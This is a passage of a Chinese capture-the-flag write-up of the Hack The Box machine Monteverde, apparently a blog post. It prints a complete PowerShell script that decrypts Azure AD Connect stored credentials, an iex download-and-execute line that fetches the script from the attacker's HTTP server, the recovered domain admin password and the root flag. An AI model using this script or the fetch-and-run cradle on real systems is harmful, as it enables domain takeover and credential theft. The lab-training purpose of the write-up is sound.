+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Monteverde 是一台中型 Windows 计算机，具有 Azure AD Connect 功能。枚举域并创建用户列表。通过密码喷射，发现“SABatchJobs”服务帐户将用户名作为密码。使用此服务帐户，可以枚举系统上的 SMB 共享，并且发现“$users”共享是世界可读的。用于 Azure AD 帐户的 XML 文件位于用户文件夹中，并且包含密码。由于密码重用，我们可以使用 WinRM 作为“mhope”连接到域控制器。枚举显示已安装“Azure AD Connect”。可以提取将目录更改复制到 Azure 的帐户（在本例中为默认域管理员）的凭据。<br></code></pre></td></tr></table></figure>
+
+<p>21、下面的步骤就是利用的步骤，我是不行了，一点都没接触过，只能参考演练报告了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd C:\<span class="hljs-string">&quot;Program Files&quot;</span><br>*Evil-WinRM* PS C:\Program Files&gt; ls *Azure*<br><br><br>    Directory: C:\Program Files<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">51</span> PM                Microsoft Azure Active Directory Connect<br>d-----         <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">37</span> PM                Microsoft Azure Active Directory Connect Upgrader<br>d-----         <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">02</span> PM                Microsoft Azure AD Connect Health Sync Agent<br>d-----         <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">53</span> PM                Microsoft Azure AD Sync<br><br><br>*Evil-WinRM* PS C:\Program Files&gt; <br><br><br>https:<span class="hljs-comment">//blog.xpnsec.com/azuread-connect-for-redteam/</span><br><br><br>iex(new-object net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.14.16/Get-MSOLCredentials.ps1&#x27;</span>)<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat Get-MSOLCredentials.ps1 <br>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span class="hljs-string">&quot;Server=127.0.0.1;Database=ADSync;Integrated Security=True&quot;</span><br>$client.Open()<br>$cmd = $client.CreateCommand()<br>$cmd.CommandText = <span class="hljs-string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span><br>$reader = $cmd.ExecuteReader()<br>$reader.Read() | Out-Null<br>$key_id = $reader.GetInt32(<span class="hljs-number">0</span>)<br>$instance_id = $reader.GetGuid(<span class="hljs-number">1</span>)<br>$entropy = $reader.GetGuid(<span class="hljs-number">2</span>)<br>$reader.Close()<br><br>$cmd = $client.CreateCommand()<br>$cmd.CommandText = <span class="hljs-string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span><br>$reader = $cmd.ExecuteReader()<br>$reader.Read() | Out-Null<br>$config = $reader.GetString(<span class="hljs-number">0</span>)<br>$crypted = $reader.GetString(<span class="hljs-number">1</span>)<br>$reader.Close()<br><br>add-type -path <span class="hljs-string">&#x27;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#x27;</span><br>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager<br>$km.LoadKeySet($entropy, $instance_id, $key_id)<br>$key = $null<br>$km.GetActiveCredentialKey([ref]$key)<br>$key2 = $null<br>$km.GetKey(<span class="hljs-number">1</span>, [ref]$key2)<br>$decrypted = $null<br>$key2.DecryptBase64ToString($crypted, [ref]$decrypted)<br>$domain = select-xml -Content $config -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Domain&#x27;</span>; Expression = &#123;$_.node.InnerXML&#125;&#125;<br>$username = select-xml -Content $config -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Username&#x27;</span>; Expression = &#123;$_.node.InnerXML&#125;&#125;<br>$password = select-xml -Content $decrypted -XPath <span class="hljs-string">&quot;//attribute&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Password&#x27;</span>; Expression = &#123;$_.node.InnerXML&#125;&#125;<br>Write-Host (<span class="hljs-string">&quot;Domain: &quot;</span> + $domain.Domain)<br>Write-Host (<span class="hljs-string">&quot;Username: &quot;</span> + $username.Username)<br>Write-Host (<span class="hljs-string">&quot;Password: &quot;</span> + $password.Password)<br><br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server <span class="hljs-number">80</span>                                <br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> - - [<span class="hljs-number">12</span>/May/<span class="hljs-number">2024</span> <span class="hljs-number">04</span>:<span class="hljs-number">31</span>:<span class="hljs-number">52</span>] <span class="hljs-string">&quot;GET /Get-MSOLCredentials.ps1 HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br><br><br>*Evil-WinRM* PS C:\Program Files&gt; cd C:\Users\mhope\Desktop<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; iex(new-object net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.14.16/Get-MSOLCredentials.ps1&#x27;</span>)<br>Domain: MEGABANK.LOCAL<br>Username: administrator<br>Password: d0m@in4dminyeah!<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>http:\sh1yan.top\photo\Monteverde-htb-writeup&#x2F;Get-MSOLCredentials.ps1</p>
+<p>22、这里利用里，我们获取到了最后的账号密码，我们直接那最后的flag吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u administrator -p <span class="hljs-string">&#x27;d0m@in4dminyeah!&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls<br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">5</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM             <span class="hljs-number">34</span> root.txt<br><br><br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt<br><span class="hljs-number">6f</span>9d52cc95e11d46a4ac2aa7b85ae634<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/223</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Monteverde-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/11/Monteverde-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/13/Cascade-htb-writeup/" title="Cascade-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Cascade-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/10/Sauna-htb-writeup/" title="Sauna-htb-writeup">
+                        <span class="hidden-mobile">Sauna-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
